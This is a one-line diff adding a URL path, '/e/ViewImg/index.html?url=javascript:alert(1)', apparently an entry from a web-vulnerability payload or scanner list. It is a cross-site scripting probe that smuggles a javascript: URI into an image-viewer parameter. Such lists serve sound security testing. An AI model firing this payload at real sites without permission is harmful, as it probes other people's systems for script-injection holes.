@@ -1,0 +1,1 @@
+/e/ViewImg/index.html?url=javascript:alert(1)
